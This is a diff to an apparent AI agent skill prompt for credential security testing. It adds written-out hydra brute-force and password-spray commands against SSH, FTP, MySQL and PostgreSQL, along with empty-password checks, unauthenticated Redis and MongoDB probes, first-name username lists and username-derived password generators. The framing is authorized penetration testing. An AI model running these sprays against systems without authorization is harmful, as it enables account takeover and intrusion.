@@ -16,6 +16,35 @@ You are an expert credential security tester. Your goal: systematically test aut
 
 ---
 
+## Chained from `/pentester` — Discovered Credential Material
+
+When invoked from the pentester skill with discovered usernames, hashes, or credential context:
+
+1. **Parse the arguments** — extract: target IP/hostname, services list (e.g. `service=ssh,ftp,http`), user list path (e.g. `userlist=/tmp/discovered-users.txt`), and any context about how the material was discovered.
+
+2. **Load the discovered user list** (if provided) — read the file via `kali_exec` (`cat /tmp/discovered-users.txt`). These are **confirmed usernames** on the target system — they take priority over generic wordlists.
+
+3. **If NO user list was provided**: run Phase 2.1 (platform-aware username expansion) IMMEDIATELY to build `/tmp/spray-users.txt`. This is critical — even without a discovered user list, the expanded list includes common first names and platform-specific accounts that catch weak credentials like `anne:princess` that generic shortlists miss entirely.
+
+4. **Expand the user list with mutations** — generate username variants from the discovered (or platform-generated) names:
+   ```
+   kali(command="cat /tmp/discovered-users.txt | while read user; do echo $user; echo ${user,,}; echo ${user^^}; echo ${user^}; done | sort -u > /tmp/expanded-users.txt")
+   ```
+   Also try: first.last, flast, firstl, first, last (if full names are available).
+
+5. **Target ALL discovered services** — not just the service where the list was found. If FTP exposed users, test SSH, HTTP, SMB, and every other auth service found during recon. The cross-service spray in Phase 6 is mandatory.
+
+6. **Build context-aware wordlists** — use the discovery context to inform wordlist generation:
+   - If users came from a backup file: try the hostname, domain name, and service names as password bases
+   - If users came from a web application: run `cewl` on the web target to build site-specific wordlists
+   - Always generate username-as-password variants: `username`, `Username1!`, `username123`, `username2024!`, `USERNAME`
+
+7. **Skip Phase 1 (service discovery)** if the pentester already provided the services list — go straight to Phase 2 (default creds) with the discovered or expanded user list.
+
+8. **Use the top-1000 password list minimum** — never use `top-20-common-SSH-passwords.txt` or similar tiny lists. The `10-million-password-list-top-1000.txt` from SecLists is the minimum for any spraying operation. It includes common names (`princess`, `sunshine`, `dragon`, `charlie`, etc.) that tiny lists omit.
+
+---
+
 ## Tools Available
 
 | Tool | Use for |
@@ -99,12 +128,65 @@ If depth/service is unspecified, ask:
 
 ### Phase 2 — Default Credential Testing
 
+**2.0 — Empty/blank password check (always run first):**
+
+Test empty passwords before anything else. Misconfigured services (SSH `PermitEmptyPasswords yes`, MySQL root with no password, anonymous FTP with credentials, PostgreSQL `trust` auth) are a quick critical win:
+
+```
+# SSH — empty password for common service accounts
+kali(command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' TARGET ssh -t 4 -W 3")
+# If discovered usernames exist, test those too
+kali(command="hydra -L /tmp/discovered-users.txt -p '' TARGET ssh -t 4 -W 3")
+# MySQL — root with no password
+kali(command="hydra -l root -p '' TARGET mysql -t 4")
+# PostgreSQL — postgres with no password
+kali(command="hydra -l postgres -p '' TARGET postgres -t 4")
+# FTP — common accounts with empty password
+kali(command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' TARGET ftp -t 4")
+# Redis — no auth
+kali(command="redis-cli -h TARGET ping")
+# MongoDB — no auth
+kali(command="mongosh --host TARGET --eval 'db.adminCommand({listDatabases:1})'")
+```
+
+Report any empty-password login as **Critical** — it's zero-effort access.
+
+**2.1 — Platform-aware username expansion (when no discovered user list exists):**
+
+When invoked WITHOUT a `userlist=` argument, build a comprehensive username list from multiple sources before testing:
+
+```
+kali(command="cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt > /tmp/spray-users.txt")
+```
+
+Then append platform-specific usernames based on detected OS/service banners:
+
+| Banner contains | Append usernames |
+|-----------------|-----------------|
+| `Debian`, `Ubuntu` | `www-data`, `pi`, `ftpuser`, `debian`, `ubuntu` |
+| `CentOS`, `Red Hat`, `Fedora` | `centos`, `ec2-user`, `fedora` |
+| `FreeBSD` | `freebsd`, `toor` |
+| GCP (`googleusercontent.com`) | `google-sudoer`, `chronos` |
+| AWS (`amazonaws.com`) | `ec2-user`, `ubuntu`, `centos`, `admin`, `bitnami` |
+| Azure | `azureuser`, `azure` |
+| Docker (hostname looks like container ID) | `app`, `node`, `web`, `deploy` |
+| FTP service present | `ftp`, `ftpuser`, `anonymous`, `backup` |
+| Any SSH | Common first names: `james`, `john`, `robert`, `michael`, `david`, `richard`, `joseph`, `thomas`, `charles`, `daniel`, `matthew`, `anthony`, `mark`, `donald`, `steven`, `paul`, `andrew`, `joshua`, `kenneth`, `kevin`, `brian`, `george`, `timothy`, `ronald`, `edward`, `jason`, `jeffrey`, `ryan`, `jacob`, `gary`, `nicholas`, `eric`, `jonathan`, `stephen`, `larry`, `justin`, `scott`, `brandon`, `benjamin`, `samuel`, `raymond`, `gregory`, `frank`, `jack`, `dennis`, `jerry`, `tyler`, `aaron`, `jose`, `nathan`, `henry`, `peter`, `mary`, `patricia`, `jennifer`, `linda`, `barbara`, `elizabeth`, `susan`, `jessica`, `sarah`, `karen`, `lisa`, `nancy`, `betty`, `margaret`, `sandra`, `ashley`, `dorothy`, `kimberly`, `emily`, `donna`, `michelle`, `carol`, `amanda`, `melissa`, `deborah`, `stephanie`, `rebecca`, `sharon`, `laura`, `cynthia`, `kathleen`, `amy`, `angela`, `shirley`, `anna`, `brenda`, `pamela`, `emma`, `nicole`, `helen`, `samantha`, `katherine`, `christine`, `debra`, `rachel`, `carolyn`, `janet`, `catherine`, `maria`, `heather`, `diane`, `ruth`, `julie`, `olivia`, `joyce`, `virginia`, `victoria`, `kelly`, `lauren`, `christina`, `joan`, `evelyn`, `judith`, `megan`, `andrea`, `cheryl`, `hannah`, `jacqueline`, `martha`, `gloria`, `teresa`, `ann`, `anne`, `sara`, `madison`, `frances`, `kathryn`, `janice`, `jean`, `abigail`, `alice`, `judy`, `sophia`, `grace`, `denise`, `amber`, `doris`, `marilyn`, `danielle`, `beverly`, `isabella`, `theresa`, `diana`, `natalie`, `brittany`, `charlotte`, `marie`, `kayla`, `alexis`, `lori` |
+
+```
+kali(command="printf 'anne\njohn\nmary\njames\n...\n' >> /tmp/spray-users.txt && sort -u /tmp/spray-users.txt -o /tmp/spray-users.txt")
+```
+
+Use `/tmp/spray-users.txt` as the user list for all Phase 2 and Phase 6 commands. This ensures common first names (like `anne`) are tested even when no explicit user list has been discovered.
+
+**2.2 — Default credential wordlists:**
+
 Run `scan(tool="nuclei", target=URL, options={"templates": "default-login"})` in parallel with service-specific defaults:
 
 | Service | Command |
 |---------|---------|
-| SSH | `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt TARGET ssh -t 4` |
-| FTP | Same wordlists, `TARGET ftp -t 4` |
+| SSH | `hydra -L /tmp/spray-users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -s PORT TARGET ssh -t 4 -W 3` (use `/tmp/spray-users.txt` from Phase 2.1 if no discovered user list, or `/tmp/discovered-users.txt` if available). **Do NOT use `top-20-common-SSH-passwords.txt`** — it's too small and misses common passwords like `princess`, `sunshine`, `dragon`, etc. The top-1000 list takes ~4 min with 4 threads per user and catches the vast majority of weak passwords. |
+| FTP | Same user list + password list, `TARGET ftp -t 4` |
 | MySQL | `-l root`, same pass list, `TARGET mysql -t 4` |
 | PostgreSQL | `-l postgres`, `TARGET postgres -t 4` |
 | SMB | `nxc smb TARGET -u administrator -p /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` |
@@ -175,6 +257,49 @@ Add confirmed users to `/tmp/valid-users.txt` for spraying.
 
 ### Phase 5 — Advanced Wordlist Mutation (standard+)
 
+**5.0 — Username-derived passwords (always run first when a user list exists):**
+
+When you have discovered usernames, these are your highest-priority password candidates — many users set passwords based on their own username:
+
+```
+kali(command="cat /tmp/discovered-users.txt | while read u; do
+  echo ''
+  echo \"$u\"
+  echo \"${u^}\"
+  echo \"${u}1\"
+  echo \"${u}123\"
+  echo \"${u}!\"
+  echo \"${u}1!\"
+  echo \"${u}123!\"
+  echo \"${u}@123\"
+  echo \"${u}2024\"
+  echo \"${u}2025\"
+  echo \"${u}2026\"
+  echo \"${u^}1!\"
+  echo \"${u^}123\"
+  echo \"${u^}123!\"
+  echo \"${u^}2024!\"
+  echo \"${u^}2025!\"
+  echo \"${u^}2026!\"
+  echo \"P@ssw0rd\"
+  echo \"Password1\"
+  echo \"Password123!\"
+  echo \"Welcome1!\"
+  echo \"Changeme1!\"
+done | sort -u > /tmp/username-passwords.txt")
+```
+
+Run this against ALL services before moving to generic wordlists:
+```
+kali(command="hydra -L /tmp/discovered-users.txt -P /tmp/username-passwords.txt TARGET ssh -t 4 -W 3")
+kali(command="hydra -L /tmp/discovered-users.txt -P /tmp/username-passwords.txt TARGET ftp -t 4 -W 3")
+```
+
+Also test **each username as its own password** (identity spray):
+```
+kali(command="hydra -C <(paste -d: /tmp/discovered-users.txt /tmp/discovered-users.txt) TARGET ssh -t 4")
+```
+
 1. **CeWL**: `cewl TARGET -d 2 -m 5 -w /tmp/cewl-words.txt --count`
 2. **John best64 rules** (64 most effective mutations — append digits, toggle case, reverse):
    ```
@@ -201,6 +326,8 @@ Add confirmed users to `/tmp/valid-users.txt` for spraying.
 ---
 
 ### Phase 6 — Cross-Service Credential Spray (standard+)
+
+**IMPORTANT: This phase is MANDATORY whenever multiple auth services exist OR a user list (discovered or platform-generated) is available.** Every username must be tested against every discovered auth service — not just the service where the list was found. If FTP exposed a user list, SSH and HTTP are equally valid targets. If no discovered user list exists, use `/tmp/spray-users.txt` from Phase 2.1 (platform-aware expansion) — it includes common first names and platform-specific accounts that go far beyond the generic shortlist.
 
 **Single-service spray** (respect lockout threshold from Phase 3):
 ```
